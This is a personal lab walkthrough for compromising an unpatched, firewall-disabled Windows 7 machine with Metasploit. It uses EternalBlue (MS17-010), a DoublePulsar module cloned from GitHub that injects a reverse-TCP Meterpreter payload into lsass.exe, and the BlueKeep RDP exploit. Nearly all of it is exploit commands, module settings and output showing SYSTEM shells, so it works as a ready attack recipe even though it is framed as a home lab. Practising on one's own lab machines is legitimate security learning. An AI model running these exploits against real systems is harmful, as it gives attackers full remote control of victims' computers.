0. install 64bit Win7 and don't update it fully.
1. Disable firewall


139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)


Lets try Eternalblue exploit on this machine

    lets check it:
        use auxiliary/scanner/smb/smb_ms17_010
            [+] <VICTIM IP>:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)

    lets use it
        use exploit/windows/smb/ms17_010_eternalblue
            -> got meterpreter shell
                meterpreter > getuid
                Server username: NT AUTHORITY\SYSTEM

    
let use Doublepulsar Eternalblue
    setup:
        sudo git clone https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit.git
        install notepad++ just to get .wine/drive_c folder...
        cd Eternalblue-Doublepulsar-Metasploit
        cp -r deps /usr/share/metasploit-framework/modules/exploits/windows/smb/
        cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb 
        cp -r Eternalblue-Doublepulsar-Metasploit /root/

    lets try it:
        use exploit/windows/smb/eternalblue_doublepulsar
        set processinject lsass.exe
        set payload windows/x64/meterpreter/reverse_tcp
        set winepath /home/kali/.wine/drive_c

            meterpreter > shell
            Process 2032 created.
            Channel 1 created.
            Microsoft Windows [Version 6.1.7601]
            Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

            C:\Windows\system32>whoami
            whoami
            nt authority\system



let use BlueKeep:
    setup:
        open port 3389 (remote desktop) on Win7 machine

    lets try it:
        use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
            [+] <VICTIM IP>:3389   - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.

        use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
        set target 2 -> virtualbox win7
            meterpreter > shell
            Process 2748 created.
            Channel 1 created.
            Microsoft Windows [Version 6.1.7601]
            Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

            C:\Windows\system32>whoami
            whoami
            nt authority\system



